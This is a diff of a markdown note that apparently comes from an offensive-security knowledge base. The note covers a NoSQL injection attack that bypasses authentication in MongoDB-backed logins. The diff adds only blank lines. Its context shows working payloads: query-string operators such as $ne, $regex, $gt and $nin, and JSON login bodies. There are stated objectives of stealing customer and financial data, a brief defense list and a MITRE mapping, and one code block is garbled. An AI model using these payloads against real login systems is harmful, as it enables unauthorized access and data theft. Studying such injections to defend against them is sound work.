@@ -37,6 +37,8 @@ From a technical standpoint, this attack exploits a vulnerability in the applica
 
 The business value of this attack is significant, as it can allow an attacker to gain access to sensitive data, such as customer records, financial data, and intellectual property. This can result in reputational damage, financial loss, and legal liability for the victim organization.
 
+ 
+
 ## Requirements
 
 1. Access to the target application
@@ -44,6 +46,8 @@ The business value of this attack is significant, as it can allow an attacker to
 1. Knowledge of the authentication mechanism
 
 1. Ability to craft a specially crafted payload
+
+ 
 
 ## Defense
 
@@ -53,11 +57,15 @@ The business value of this attack is significant, as it can allow an attacker to
 
 1. Implement multi-factor authentication to reduce the risk of authentication bypass
 
+ 
+
 ## Objectives
 
 1. Bypass authentication and gain unauthorized access to sensitive data
 
 1. Steal sensitive data such as customer records, financial data, and intellectual property
+
+ 
 
 # Instructions
 
@@ -76,11 +84,19 @@ login[$regex]=value&pass[$ne]=value
 login[$gt]=value&login[$lt]=value&pass[$ne]=value
 login[$nin][]=value&login[$nin][]=value&pass[$ne]=value
 
+ 
+
+
+
 **Code**: [[in DATA
 username[$ne]=toto&password[$ne]=toto
 logi]]
 
+
+
 > This command can be used to bypass basic authentication by specifying values that are not equal to the expected ones or by specifying a value greater than the expected one. The $ne operator is used to specify values that are not equal to the expected ones, while the $gt operator is used to specify values that are greater than the expected ones. The $regex operator can be used to specify a regular expression that matches the expected value. The $lt operator can be used to specify values that are less than the expected ones. The $nin operator can be used to specify values that are not in a list of expected values.
+
+
 
 **Command** ([[Filtering Data using MongoDB Query Operators]]):
 
@@ -91,6 +107,10 @@ login[$gt]=admin&login[$lt]=test&pass[$ne]=1
 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 ```
 
+
+
+
+
 **Command** ([[Converting Data to JSON using MongoDB Query Operators]]):
 
 ```bash
@@ -99,6 +119,8 @@ login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
 {"username": {"$gt":""}, "password": {"$gt":""}}
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -122,3 +144,5 @@ login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 - [[Authentication Bypass]]
 - [[Exploit]]
 - [[NoSQL Injection]]
+
+
